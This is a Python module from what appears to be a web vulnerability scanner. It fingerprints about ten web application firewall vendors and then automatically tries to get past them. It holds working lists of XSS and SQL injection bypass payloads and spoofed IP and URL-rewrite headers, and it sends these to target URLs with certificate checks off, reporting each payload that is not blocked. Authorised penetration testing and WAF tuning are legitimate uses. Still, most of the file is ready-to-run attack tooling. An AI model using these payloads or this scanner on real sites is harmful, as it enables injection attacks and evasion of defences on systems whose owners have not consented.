"""
WAF Fingerprinting + Auto Bypass Module
Detects WAF presence and attempts intelligent bypass techniques
"""

import re
import time
from urllib.parse import urlparse, parse_qsl, urlencode
from typing import List, Optional, Dict, Tuple
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from utils.logger import setup_logger


@dataclass
class WAFFinding:
    """Represents a WAF detection or bypass finding"""
    url: str
    type: str        # 'waf_detected', 'waf_bypass', 'no_waf'
    waf_name: str
    severity: str
    confidence: str
    bypass_technique: str
    payload_original: str
    payload_bypassed: str
    evidence: str
    remediation: str


class WAFBypassScanner:
    """
    WAF Fingerprinting + Auto Bypass Module
    Detects:
    - WAF vendor identification (Cloudflare, ModSecurity, Akamai, etc.)
    - WAF bypass via encoding tricks
    - WAF bypass via case manipulation
    - WAF bypass via comment injection
    - WAF bypass via HTTP header manipulation
    - WAF bypass via chunked encoding
    - Context-aware bypass payload generation
    """

    def __init__(self, rate_limiter: RateLimiter):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("WAFBypass")
        self.findings: List[WAFFinding] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(20.0, connect=10.0)
        self.waf_name = "Unknown"

        # WAF fingerprint signatures
        self.waf_signatures = self._build_waf_signatures()

        # Bypass techniques for XSS
        self.xss_bypasses = self._build_xss_bypasses()

        # Bypass techniques for SQLi
        self.sqli_bypasses = self._build_sqli_bypasses()

    def _build_waf_signatures(self) -> List[Dict]:
        return [
            {
                "name": "Cloudflare",
                "checks": [
                    {"type": "header", "key": "cf-ray",              "pattern": r".+"},
                    {"type": "header", "key": "server",              "pattern": r"cloudflare"},
                    {"type": "header", "key": "cf-cache-status",     "pattern": r".+"},
                    {"type": "body",   "pattern": r"cloudflare|Ray ID|cf-ray",  "status": [403, 429, 503]},
                ]
            },
            {
                "name": "ModSecurity",
                "checks": [
                    {"type": "header", "key": "server",  "pattern": r"mod_security|ModSecurity"},
                    {"type": "body",   "pattern": r"ModSecurity|Mod_Security|NOYB", "status": [403]},
                    {"type": "header", "key": "x-modsecurity-id", "pattern": r".+"},
                ]
            },
            {
                "name": "AWS WAF",
                "checks": [
                    {"type": "header", "key": "x-amzn-requestid",   "pattern": r".+"},
                    {"type": "header", "key": "x-amzn-errortype",   "pattern": r"403"},
                    {"type": "body",   "pattern": r"AWS WAF|Request blocked", "status": [403]},
                ]
            },
            {
                "name": "Akamai",
                "checks": [
                    {"type": "header", "key": "x-akamai-transformed", "pattern": r".+"},
                    {"type": "header", "key": "server",               "pattern": r"AkamaiGHost"},
                    {"type": "body",   "pattern": r"Access Denied.*Akamai|Reference.*\d{2}\.\w+\.\w+", "status": [403]},
                ]
            },
            {
                "name": "Imperva/Incapsula",
                "checks": [
                    {"type": "header", "key": "x-iinfo",       "pattern": r".+"},
                    {"type": "cookie", "pattern": r"incap_ses|visid_incap"},
                    {"type": "body",   "pattern": r"Incapsula incident|Request unsuccessful.*Incapsula", "status": [403]},
                ]
            },
            {
                "name": "Sucuri",
                "checks": [
                    {"type": "header", "key": "x-sucuri-id",  "pattern": r".+"},
                    {"type": "body",   "pattern": r"Sucuri WebSite Firewall|sucuri\.net", "status": [403]},
                ]
            },
            {
                "name": "F5 BIG-IP ASM",
                "checks": [
                    {"type": "cookie", "pattern": r"TS[a-zA-Z0-9]{8}"},
                    {"type": "header", "key": "x-wa-info",    "pattern": r".+"},
                    {"type": "body",   "pattern": r"The requested URL was rejected|F5 Networks", "status": [403]},
                ]
            },
            {
                "name": "Barracuda",
                "checks": [
                    {"type": "cookie", "pattern": r"bni__ses|bni_persistence"},
                    {"type": "body",   "pattern": r"Barracuda Networks|barra_counter_session", "status": [403]},
                ]
            },
            {
                "name": "Fortinet",
                "checks": [
                    {"type": "body",   "pattern": r"FortiGate|FortiWeb|Fortigate Application Control", "status": [403]},
                    {"type": "header", "key": "x-fortigate", "pattern": r".+"},
                ]
            },
            {
                "name": "Wordfence",
                "checks": [
                    {"type": "body",   "pattern": r"Wordfence|generated by Wordfence", "status": [403]},
                ]
            },
        ]

    def _build_xss_bypasses(self) -> List[Tuple[str, str]]:
        """XSS bypass payloads with technique names"""
        return [
            # (payload, technique)
            ("<script>alert(1)</script>",                                       "baseline"),
            ("<ScRiPt>alert(1)</ScRiPt>",                                       "case_mixing"),
            ("<script >alert(1)</script >",                                     "space_injection"),
            ("</script><script>alert(1)</script>",                              "tag_break"),
            ("<img src=x onerror=alert(1)>",                                    "img_onerror"),
            ("<img src=x onerror=alert(1) />",                                  "img_self_close"),
            ("<ImG sRc=x OnErRoR=alert(1)>",                                   "img_case_mix"),
            ("<svg onload=alert(1)>",                                           "svg_onload"),
            ("<svg/onload=alert(1)>",                                           "svg_slash"),
            ("<SVG ONLOAD=alert(1)>",                                           "svg_uppercase"),
            ("<body onload=alert(1)>",                                          "body_onload"),
            ("<details open ontoggle=alert(1)>",                                "details_tag"),
            ("<video src=x onerror=alert(1)>",                                  "video_tag"),
            ("<input autofocus onfocus=alert(1)>",                              "input_focus"),
            ("javascript:alert(1)",                                             "js_protocol"),
            ("jaVaScRiPt:alert(1)",                                             "js_protocol_case"),
            ("%3Cscript%3Ealert(1)%3C/script%3E",                              "url_encode"),
            ("%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",                          "url_encode_img"),
            ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",                 "html_entity_hex"),
            ("&#60;script&#62;alert(1)&#60;/script&#62;",                      "html_entity_dec"),
            ("<script\x0atype='text/javascript'>alert(1)</script>",            "newline_inject"),
            ("<script\x09>alert(1)</script>",                                   "tab_inject"),
            ("<<script>alert(1)//<</script>",                                  "double_open"),
            ("<script>alert`1`</script>",                                       "template_literal"),
            ("<script>alert(String.fromCharCode(49))</script>",                "charcode"),
            ("<script src=data:,alert(1)>",                                    "data_uri"),
            ("<iframe srcdoc='<script>alert(1)</script>'>",                    "iframe_srcdoc"),
            ("<math><mi//xlink:href='javascript:alert(1)'>",                   "mathml"),
            ("'-alert(1)-'",                                                    "js_string_break"),
            ("\"-alert(1)-\"",                                                  "js_dquote_break"),
        ]

    def _build_sqli_bypasses(self) -> List[Tuple[str, str]]:
        """SQLi bypass payloads with technique names"""
        return [
            # (payload, technique)
            ("' OR 1=1--",                                                      "baseline"),
            ("' OR 1=1-- -",                                                    "dash_space"),
            ("' OR 1=1#",                                                       "hash_comment"),
            ("' oR 1=1--",                                                      "case_mixing"),
            ("' OR/**/ 1=1--",                                                  "comment_space"),
            ("'/**/OR/**/1=1--",                                                "comment_everywhere"),
            ("' OR 0x31=0x31--",                                                "hex_values"),
            ("' OR CHAR(49)=CHAR(49)--",                                        "char_function"),
            ("' OR 1 LIKE 1--",                                                 "like_operator"),
            ("' OR 1 BETWEEN 0 AND 2--",                                        "between_operator"),
            ("' OR 2>1--",                                                      "greater_than"),
            ("'||'1'='1",                                                       "concat_operator"),
            ("' OR 'x'='x",                                                     "string_compare"),
            ("%27%20OR%201%3D1--",                                              "url_encode"),
            ("' OR%201=1--",                                                    "partial_encode"),
            ("' /*!OR*/ 1=1--",                                                 "mysql_version_comment"),
            ("' OR /*!50000 1*/=1--",                                           "mysql_conditional"),
            ("1;SELECT SLEEP(5)--",                                             "time_based"),
            ("1 AND SLEEP(5)--",                                                "sleep_and"),
            ("';WAITFOR DELAY '0:0:5'--",                                       "mssql_delay"),
            ("' UNION SELECT NULL--",                                           "union_null"),
            ("' UNION SELECT NULL,NULL--",                                      "union_2null"),
            ("' UNION ALL SELECT NULL--",                                       "union_all"),
            ("' UNION/**/SELECT/**/NULL--",                                     "union_comment"),
        ]

    async def _fetch(self, url: str, params: Optional[Dict] = None,
                     extra_headers: Optional[Dict] = None) -> Optional[Tuple[httpx.Response, float]]:
        """Make request and return (response, elapsed)"""
        try:
            start = time.monotonic()
            async def _do_request():
                return await self.client.get(
                    url,
                    params=params,
                    headers=extra_headers or {},
                    follow_redirects=True
                )
            response = await self.rate_limiter.execute_with_retry(_do_request)
            elapsed = time.monotonic() - start
            return response, elapsed
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None, 0

    def _detect_waf_from_response(self, response: httpx.Response) -> Tuple[str, str]:
        """
        Detect WAF from response.
        Returns (waf_name, confidence)
        """
        headers   = {k.lower(): v for k, v in response.headers.items()}
        body      = response.text
        status    = response.status_code
        cookies   = "; ".join(response.cookies.values())

        for sig in self.waf_signatures:
            for check in sig["checks"]:
                matched = False

                if check["type"] == "header":
                    val = headers.get(check["key"].lower(), "")
                    if val and re.search(check["pattern"], val, re.IGNORECASE):
                        matched = True

                elif check["type"] == "body":
                    expected_statuses = check.get("status", [])
                    if (not expected_statuses or status in expected_statuses):
                        if re.search(check["pattern"], body, re.IGNORECASE):
                            matched = True

                elif check["type"] == "cookie":
                    if re.search(check["pattern"], cookies, re.IGNORECASE):
                        matched = True

                if matched:
                    return sig["name"], "high"

        return "", "low"

    def _is_blocked(self, response: httpx.Response) -> bool:
        """Check if response indicates WAF block"""
        if response.status_code in [403, 406, 429, 503]:
            return True
        block_patterns = [
            r"access denied", r"request blocked", r"forbidden",
            r"security violation", r"attack detected", r"blocked",
            r"not acceptable", r"suspicious activity"
        ]
        body_lower = response.text.lower()
        return any(re.search(p, body_lower) for p in block_patterns)

    async def fingerprint_waf(self, url: str) -> Tuple[str, str]:
        """
        Send a known malicious payload to trigger WAF,
        then fingerprint from response.
        """
        trigger_payload = "<script>alert(1)</script>"
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        if params:
            # Inject into first param
            first_param = list(params.keys())[0]
            test_params = params.copy()
            test_params[first_param] = trigger_payload
            test_url = parsed._replace(query=urlencode(test_params)).geturl()
        else:
            test_url = url + f"?test={trigger_payload}"

        result = await self._fetch(test_url)
        if not result[0]:
            return "", "low"

        response, _ = result
        return self._detect_waf_from_response(response)

    async def test_xss_bypass(self, url: str, param: str,
                               baseline_response: httpx.Response) -> List[WAFFinding]:
        """Test XSS WAF bypasses on a parameter"""
        findings = []
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        if param not in params:
            return []

        blocked_baseline = self._is_blocked(baseline_response)

        for payload, technique in self.xss_bypasses:
            if technique == "baseline":
                continue  # Already tested

            test_params = params.copy()
            test_params[param] = payload
            test_url = parsed._replace(query=urlencode(test_params)).geturl()

            result = await self._fetch(test_url)
            if not result[0]:
                continue

            response, _ = result

            # If baseline was blocked but this isn't = bypass!
            if blocked_baseline and not self._is_blocked(response):
                findings.append(WAFFinding(
                    url=url,
                    type="waf_bypass",
                    waf_name=self.waf_name,
                    severity="high",
                    confidence="high",
                    bypass_technique=technique,
                    payload_original="<script>alert(1)</script>",
                    payload_bypassed=payload,
                    evidence=(
                        f"WAF bypass via '{technique}': "
                        f"Original payload blocked (HTTP {baseline_response.status_code}), "
                        f"bypassed payload returned HTTP {response.status_code}"
                    ),
                    remediation=self._get_remediation()
                ))
                self.logger.warning(
                    f"WAF BYPASS [{self.waf_name}]: {technique} | {payload[:50]}"
                )

        return findings

    async def test_sqli_bypass(self, url: str, param: str,
                                baseline_response: httpx.Response) -> List[WAFFinding]:
        """Test SQLi WAF bypasses on a parameter"""
        findings = []
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        if param not in params:
            return []

        blocked_baseline = self._is_blocked(baseline_response)

        for payload, technique in self.sqli_bypasses:
            if technique == "baseline":
                continue

            test_params = params.copy()
            test_params[param] = payload
            test_url = parsed._replace(query=urlencode(test_params)).geturl()

            result = await self._fetch(test_url)
            if not result[0]:
                continue

            response, _ = result

            if blocked_baseline and not self._is_blocked(response):
                findings.append(WAFFinding(
                    url=url,
                    type="waf_bypass",
                    waf_name=self.waf_name,
                    severity="high",
                    confidence="high",
                    bypass_technique=technique,
                    payload_original="' OR 1=1--",
                    payload_bypassed=payload,
                    evidence=(
                        f"SQLi WAF bypass via '{technique}': "
                        f"Original blocked (HTTP {baseline_response.status_code}), "
                        f"bypassed returned HTTP {response.status_code}"
                    ),
                    remediation=self._get_remediation()
                ))

        return findings

    async def test_header_bypass(self, url: str) -> Optional[WAFFinding]:
        """Test if WAF can be bypassed via spoofed headers"""
        bypass_headers_list = [
            {"X-Forwarded-For":      "127.0.0.1"},
            {"X-Real-IP":            "127.0.0.1"},
            {"X-Originating-IP":     "127.0.0.1"},
            {"X-Remote-IP":          "127.0.0.1"},
            {"X-Client-IP":          "127.0.0.1"},
            {"True-Client-IP":       "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host":     "localhost"},
            {"X-Original-URL":       "/admin"},
            {"X-Rewrite-URL":        "/admin"},
        ]

        # Get baseline with malicious payload
        trigger_url = url + ("&" if "?" in url else "?") + "test=<script>alert(1)</script>"
        baseline, _ = await self._fetch(trigger_url)
        if not baseline:
            return None

        if not self._is_blocked(baseline):
            return None  # No WAF to bypass

        for bypass_headers in bypass_headers_list:
            result = await self._fetch(trigger_url, extra_headers=bypass_headers)
            if not result[0]:
                continue

            response, _ = result
            if not self._is_blocked(response):
                header_name = list(bypass_headers.keys())[0]
                return WAFFinding(
                    url=url,
                    type="waf_bypass",
                    waf_name=self.waf_name,
                    severity="critical",
                    confidence="high",
                    bypass_technique=f"header_spoofing:{header_name}",
                    payload_original="<script>alert(1)</script>",
                    payload_bypassed=f"{header_name}: {list(bypass_headers.values())[0]}",
                    evidence=(
                        f"WAF bypassed via header '{header_name}: {list(bypass_headers.values())[0]}'. "
                        "WAF trusts IP from this header — attacker can spoof as localhost."
                    ),
                    remediation=(
                        "1. Do not trust X-Forwarded-For or similar headers from untrusted sources.\n"
                        "2. Configure WAF to ignore spoofed IP headers.\n"
                        "3. Use WAF vendor's recommended IP header configuration."
                    )
                )

        return None

    def _get_remediation(self) -> str:
        return (
            f"1. Update {self.waf_name} WAF rules to block bypass techniques.\n"
            "2. Use multiple layers of defense — WAF alone is not sufficient.\n"
            "3. Implement server-side input validation independent of WAF.\n"
            "4. Enable WAF learning mode to tune rules.\n"
            "5. Consider upgrading WAF plan for advanced ruleset."
        )

    async def scan(self, target_urls: List[str], forms: List = None) -> List[WAFFinding]:  # BUG-003 FIX
        """Main WAF fingerprint + bypass scan"""
        forms = forms or []  # BUG-003 FIX: avoid mutable default argument
        seen_hosts = set()
        test_urls = []
        for url in target_urls:
            parsed = urlparse(url)
            host = f"{parsed.scheme}://{parsed.netloc}"
            if host not in seen_hosts:
                seen_hosts.add(host)
                test_urls.append(url)

        self.logger.info(f"Starting WAF fingerprint + bypass scan on {len(test_urls)} host(s)")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,*/*',
        }

        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client

            for url in test_urls:
                # Step 1: Fingerprint WAF
                waf_name, confidence = await self.fingerprint_waf(url)

                if waf_name:
                    self.waf_name = waf_name
                    self.findings.append(WAFFinding(
                        url=url,
                        type="waf_detected",
                        waf_name=waf_name,
                        severity="info",
                        confidence=confidence,
                        bypass_technique="N/A",
                        payload_original="<script>alert(1)</script>",
                        payload_bypassed="N/A",
                        evidence=f"WAF detected: {waf_name} (confidence: {confidence})",
                        remediation=f"WAF {waf_name} is active. Keep WAF rules updated."
                    ))
                    self.logger.info(f"WAF DETECTED: {waf_name} on {url}")
                else:
                    self.logger.info(f"No WAF detected on {url}")

                # Step 2: Test bypasses on URL params
                parsed = urlparse(url)
                params = dict(parse_qsl(parsed.query))

                for param in params.keys():
                    # Get baseline blocked response
                    test_params = params.copy()
                    test_params[param] = "<script>alert(1)</script>"
                    test_url = parsed._replace(query=urlencode(test_params)).geturl()
                    baseline, _ = await self._fetch(test_url)

                    if not baseline or not self._is_blocked(baseline):
                        continue  # No WAF blocking this param

                    # Test XSS bypasses
                    xss_findings = await self.test_xss_bypass(url, param, baseline)
                    self.findings.extend(xss_findings)

                    # Test SQLi bypasses
                    sqli_findings = await self.test_sqli_bypass(url, param, baseline)
                    self.findings.extend(sqli_findings)

                # Step 3: Header-based bypass
                header_bypass = await self.test_header_bypass(url)
                if header_bypass:
                    self.findings.append(header_bypass)

        self.logger.info(f"WAF scan complete. Found {len(self.findings)} issues")
        return self.findings
